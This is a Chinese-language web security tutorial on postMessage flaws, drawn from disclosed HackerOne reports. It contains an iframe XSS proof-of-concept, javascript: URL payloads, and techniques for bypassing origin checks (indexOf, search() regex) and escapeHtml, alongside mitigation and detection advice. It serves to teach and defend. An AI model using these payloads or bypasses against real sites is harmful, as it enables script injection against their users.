> 原文链接: https://www.anquanke.com//post/id/219088 


# 通过HackerOne漏洞报告学习PostMessage漏洞实战场景中的利用与绕过


                                阅读量   
                                **430323**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0172b0e4f75b9bb2d7.jpg)](https://p5.ssl.qhimg.com/t0172b0e4f75b9bb2d7.jpg)



## 0x00 前言

这是一篇关于`postMessage`漏洞分析的文章，主要通过hackerone平台披露的Bug Bounty报告，学习和分析`postMessage`漏洞如何在真实的场景中得到利用的。



## 0x01 什么是PostMessage

根据Mozilla开发文档描述：

> The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.

也就是说，`window.postMessage()`方法可以安全地实现`Window对象`之间的跨域通信。例如，一个页面和它所产生的弹出窗口之间，或者一个页面和嵌入其中的`iframe`之间进行。

这里，我们看一个例子：

假设我们有一个主网站`1.html`与另一个网站`2.html`进行通信。在第二个网站中，有一个后退按钮，当第一个网站的导航改变时，这个按钮就会改变。例如，在网站1中，我们导航到 `changed.html`，那么网站2中的后退按钮就会指向 `changed.html`。为此，使用`postMessage`方法将网站1的值发送到网站2。

`1.html`中的代码如下:

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Website 1&lt;/title&gt;
 &lt;meta charset="utf-8" /&gt;
&lt;script&gt;

var child;
function openChild() `{`child = window.open('2.html', 'popup', 'height=300px, width=500px');

`}`
function sendMessage()`{`
    let msg=`{`url : "changed.html"`}`;
    // In production, DO NOT use '*', use toe target domain
    child.postMessage(msg,'*')// child is the targetWindow
    child.focus();
`}`&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form&gt;
        &lt;fieldset&gt;
            &lt;input type='button' id='btnopen' value='Open child' onclick='openChild();' /&gt;
            &lt;input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' /&gt;
        &lt;/fieldset&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

网站1中有两个按钮：
- 1 . 第一个是通过`openChild()`函数打开一个包含`2.html`的弹出窗口。
- 2 . 第二个是通过`sendMessage()`函数发送消息。要做到这一点，需要设置一个消息，定义`msg`变量，然后调用`postMessage(msg,'*')`。
`2.html`中的代码如下:

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Website 2&lt;/title&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;script&gt;
    // Allow window to listen for a postMessage
    window.addEventListener("message", (event)=&gt;`{`
        // Normally you would check event.origin
        // To verify the targetOrigin matches
        // this window's domain
         document.getElementById("redirection").href=`$`{`event.data.url`}``;
        // event.data contains the message sent

    `}`);function closeMe() `{`
        try `{`window.close();
        `}` catch (e) `{` console.log(e) `}`
        try `{`self.close();
        `}` catch (e) `{` console.log(e) `}``}`
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form&gt;
        &lt;h1&gt;Recipient of postMessage&lt;/h1&gt;
            &lt;fieldset&gt;
                &lt;a type='text' id='redirection' href=''&gt;Go back&lt;/a&gt;
                &lt;input type='button' id='btnCloseMe' value='Close me' onclick='closeMe();' /&gt;
            &lt;/fieldset&gt;

    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
```

网站2中有一个链接和一个按钮:
- 1 . 链接处理重定向，`href`字段根据`window.addEventListener("message", (event)`接收到的数据而变化。接收到消息后，从`event.data`中读取事件中的数据并将url并传递给`href`。
- 2 . 按钮调用函数`closeMe()`关闭窗口。
[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602000904229-1.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602000904229-1.png)



## 0x02 一个基础漏洞的简例

### <a class="reference-link" name="XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AE%9E%E7%8E%B0"></a>XSS漏洞的实现

`PostMessages`如果执行不当，可能导致信息泄露或跨站脚本漏洞（XSS）。<br>
在这种情况下，`2.html`在没有验证源的情况下就准备接收一个消息，因此我们可以将网页`3.html`作为`iframe`加载`2.html`，并调用`postMessage()`函数来操作`href`值。

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;XSS PoC&lt;/title&gt;
 &lt;meta charset="utf-8" /&gt;


&lt;/head&gt;
&lt;body&gt;

 &lt;iframe id="frame" src="2.html" &gt;&lt;/iframe&gt;

 &lt;script&gt;

    let msg=`{`url : "javascript:prompt(1)"`}`;
    var iFrame = document.getElementById("frame")
    iFrame.contentWindow.postMessage(msg, '*');

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

在这里例子中，恶意的`msg`变量包含数据``{`url: "javascript:prompt(1)"`}`;`，该数据将被发送到`2.html`。`2.html`处理后，将`&lt;a href`中的值更改为`msg.url`的值。`iframe`用于在网站中加载攻击。当用户单击返回链接时，将实现一个XSS。

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602001428940-2.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602001428940-2.png)

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602001497660-4.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602001497660-4.png)

### <a class="reference-link" name="%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"></a>缓解措施

根据Mozilla文档中的说法。

> 如果不希望收到来自其他网站的消息，不要为任何消息添加事件监听器的。这可以完全避免此类安全问题。
如果希望从其他站点接收消息，需要对源和可能的源验证发送方的身份，因为任何窗口都可以向任何其他窗口发送消息，并且不能保证未知的发送者不会发送恶意消息。但是，在验证了身份之后仍然应该验证接收到的消息的语法，否则，也可能出现跨站点脚本攻击。
当使用postMessage向其他窗口发送数据时，一定要指定一个准确的目标，而不是*。恶意网站可以在不知情的情况下改变窗口的位置，安全的设置可以拦截使用postMessage发送的数据。

根据文档的方案，应当将`1.html`中的:

```
child.postMessage(msg,'*')
```

修改为:

```
child.postMessage(msg,'2.html')
```

将`2.html`中的:

```
window.addEventListener("message", (event)=&gt;`{`    
...
`}`
```

修改为:

```
window.addEventListener("message", (event)=&gt;`{`
    if (event.origin !== "http://safe.com")
    return;
    ...
`}`
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"></a>漏洞检测

检测`postMessage`漏洞的方法是读取`JavaScript`代码。因为当定义了一个监听器后，需要按照事件数据流来分析代码是否以容易被攻击的函数结束。这里推荐两种方法来检测函数调用：
- 1 . [J2EEScan](https://github.com/ilmila/J2EEScan)，从git仓库（[https://github.com/ilmila/J2EEScan）可以获得更新版本，而不是从](https://github.com/ilmila/J2EEScan%EF%BC%89%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%9B%B4%E6%96%B0%E7%89%88%E6%9C%AC%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E4%BB%8E) `Burp AppStore`。
- 2 . [BurpBounty](https://github.com/wagiro/BurpBounty) ([https://github.com/wagiro/BurpBounty)，定义一组用于搜索关键字的被动响应字符串，如](https://github.com/wagiro/BurpBounty)%EF%BC%8C%E5%AE%9A%E4%B9%89%E4%B8%80%E7%BB%84%E7%94%A8%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E8%A2%AB%E5%8A%A8%E5%93%8D%E5%BA%94%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%A6%82) `postMessage` 、`addEventListener("message` 、 `.on("message"`。


## 0x03 hackerone 漏洞报告分析

如果你在hackerone平台搜索`PostMessage`漏洞报告关键字，将看到一些报告，有一些漏洞被发现的时间距离现在并不遥远，并且获得了丰厚的奖励。这里重点分析3篇Hackerone披露的报告，并提供一些利用/绕过`postMessage`漏洞的技巧。

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602003546490-5.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602003546490-5.png)

### <a class="reference-link" name="DOM%20Based%20XSS%20in%20www.hackerone.com%20via%20PostMessage%20and%20Bypass%20(#398054)"></a>DOM Based XSS in www.hackerone.com via PostMessage and Bypass (#398054)

在hackeronep披露的 [#398054](https://hackerone.com/reports/398054)报告中，通过Marketo中的不安全消息事件侦听器，`Dom XSS`在Hackerone中被成功利用。代码流程如下图所示：

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602004078902-Diagram_1.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602004078902-Diagram_1.png)

通过分析报告可以看出，如果响应的设置没有错误，它就会创建一个名为`u`的变量，并将其设置为`findCorrectFollowUpUrl`方法的返回值。这将对一个名为`followUpUrl`的响应对象的属性进行处理，该属性是在表单提交完成后重定向的URL。

但是HackerOne窗体并没有用到这个，攻击者通过将其设置为绝对URL，就可以控制`u`变量的值。后来这个变量被用来改变窗口的`location.href`。当向Hackerone窗口发送下图所示的`mktoResponse`消息时，窗口被重定向到JavaScript URL，并执行代码`alert(document.domain)`。

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602005059501-exploitation_1.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602005059501-exploitation_1.png)

这部分代码由三部分组成：
- 1 . `mktoResponse`为`PostMessage`的第一个JSON元素，以调用函数:
```
else if (d.mktoResponse)`{`
    onResponse(d.mktoResponse)
`}`
```
- 2 . 为了能执行这个函数，需要一个JSON结构数据，其元素有`for`、`error`和`data`。如果`error`为`false`，则`repuest.success`执行：
```
var requestId = mktoResponse["for"];
  var request = inflight[requestId];
  if(request)`{`
    if(mktoResponse.error)`{`
      request.error(mktoResponse.data);
    `}`else`{`
      request.success(mktoResponse.data);
```
- 3 . 在这个函数中，`followUpUrl`值将关联到`u`，并传递给`location.href`。因此，有效payload`javascript:alert(document.domain)`触发XSS执行：
```
var u = findCorrectFollowUpUrl(data);
  location.href = u;
```

这个漏洞提交之后，Hackerone团队修改了`OnMessage`函数，添加了一个对源的验证:

```
if (a.originalEvent &amp;&amp; a.originalEvent.data &amp;&amp; 0 === i.indexOf(a.originalEvent.origin)) `{`
    var b;
    try `{`
        b = j.parseJSON(a.originalEvent.data)
    `}` catch (c) `{`
        return
    `}`
    b.mktoReady ? f() : b.mktoResponse &amp;&amp; e(b.mktoResponse)
`}`
```

### <a class="reference-link" name="Bypass%20#398054%20(#499030)"></a>Bypass #398054 (#499030)

[#499030](https://hackerone.com/reports/499030)找到了上述#398054漏洞修复后的绕过办法。

在上述的修复代码中，变量`i`解析为`https://app-sj17.marketo.com/`，`indexOf`检查字符串中是否包含源。因此注册一个marcarian域名`.ma`，验证将被绕过:

```
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

如果之前的漏洞攻击代码托管在注册域名`https://app-sj17.ma`下，XSS依旧会被成功执行。

### <a class="reference-link" name="CVE-2020-8127:%20XSS%20by%20calling%20arbitrary%20method%20via%20postMessage%20in%20reveal.js%20(#691977)"></a>CVE-2020-8127: XSS by calling arbitrary method via postMessage in reveal.js (#691977)

在报告[#691977](https://hackerone.com/reports/691977)中，<a>@s_p_q_r</a>提交了一个通过`PostMessage`成功利用的`DOM XSS`。代码流程如下图所示:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602006475220-Diagram_2.png)

首先，使用`addKeyBinding`方法调用`setupPostMessage`来定义带有恶意负载的JSON元素。然后，调用函数`showHelp()`在浏览器中展示出`registeredKeyBindings[binding].description`中定义的`malicios`有效payload。要利用此漏洞，使用以下代码:

[![](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602006760722-exploitation_2.png)](https://cdn.jsdelivr.net/gh/gscr10/picture/2020-10-7/1602006760722-exploitation_2.png)

这个代码片段中有三个部分:
- 1 . 将第一个JSON元素作为`"method":"addKeyBinding"`，用于调用方法并应用到`args`:
```
if( data.method &amp;&amp; typeof Reveal[data.method] === 'function' ) `{`
    Reveal[data.method].apply( Reveal, data.args );
```
- 2 . 为了到达函数`addKeyBinding`与参数`args`，构造一个JSON对象，包含`callback`、`key`、`description`：
```
function addKeyBinding( binding, callback ) `{`

    if( typeof binding === 'object' &amp;&amp; binding.keyCode ) `{`
        registeredKeyBindings[binding.keyCode] = `{`
            callback: callback,
            key: binding.key,
            description: binding.description
        `}`;
    `}`
```
- 3 . 调用`toggleHelp()`函数，在没有验证的情况下展现了包含payload的JSON数据，触发JavaScript执行：
```
function showHelp() `{`

    ...

    for( var binding in registeredKeyBindings ) `{`
        if( registeredKeyBindings[binding].key &amp;&amp; registeredKeyBindings[binding].description ) `{`
            html += '&lt;tr&gt;&lt;td&gt;' + registeredKeyBindings[binding].key + '&lt;/td&gt;&lt;td&gt;' + registeredKeyBindings[binding].description + '&lt;/td&gt;&lt;/tr&gt;';
        `}`
    `}`

    ...

`}`
```



## 0x04 绕过PostMessage漏洞的技巧

1 . 如果`indexOf()`被用来检查`PostMessage`的源，如果源包含在字符串中，有可能被绕过，如**Bypass #398054 (#499030)**中分析的那样。

2 . 如果使用`search()`来验证源，也有可能是不安全的。根据`String.prototype.search()`的文档，该方法接收一个常规的压缩对象而不是字符串,如果传递了正则表达式以外的任何东西，也将被隐式转换为正则表达的内容。例如：

```
"https://www.safedomain.com".search(t.origin)
```

在正则表达式中，点(.)被视为通配符。换句话说，源的任何字符都可以用一个点来代替。攻击者可以利用这一特点，使用一个特殊的域而不是官方的域来绕过验证，比如`www.s.afedomain.com`就可以绕过上述语法的验证。

3 . 如果使用了`escapeHtml`函数，该函数不会创建一个新的已转义的对象，而是重写现有对象的属性。这意味着，如果我们能够创建具有不响应`hasOwnProperty`的受控属性的对象，则该对象将不会被转义。例如，`File`对象非常适合这种场景的利用，因为它有只读的`name`属性，使用这个属性，可以绕过`escapeHtml`函数：

```
// Expected to fail:
result = u(`{`
  message: "'\"&lt;b&gt;\\"
`}`);
result.message // "'&amp;quot;&amp;lt;b&amp;gt;\"
// Bypassed:
result = u(new Error("'\"&lt;b&gt;\\"));
result.message; // "'"&lt;b&gt;\"
```



## 0x05 hackerone上PostMessage漏洞报告推荐

[Hackerone report #168116](https://hackerone.com/reports/168116)<br>
(Twitter: Insufficient validation on Digits bridge)

[Hackerone report #231053](https://hackerone.com/reports/231053)<br>
(Shopify: XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on “/:id/digital_wallets/dialog”)

[Hackerone report #381356](https://hackerone.com/reports/381356)<br>
(HackerOne: Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com)

[Hackerone report #207042](https://hackerone.com/reports/207042)<br>
(HackerOne: Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP)

[Hackerone report #603764](https://hackerone.com/reports/603764)<br>
(Upserve: DOM Based XSS via postMessage at [https://inventory.upserve.com/login/](https://inventory.upserve.com/login/))

[Hackerone report #217745](https://hackerone.com/reports/217745)<br>
(Shopify: XSS in $shop$.myshopify.com/admin/ via “Button Objects” in malicious app)

#### <a class="reference-link" name="%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"></a>参考文献

[https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

[https://medium.com/javascript-in-plain-english/javascript-and-window-postmessage-a60c8f6adea9](https://medium.com/javascript-in-plain-english/javascript-and-window-postmessage-a60c8f6adea9)

[https://hackerone.com/hacktivity?querystring=postmessage](https://hackerone.com/hacktivity?querystring=postmessage)
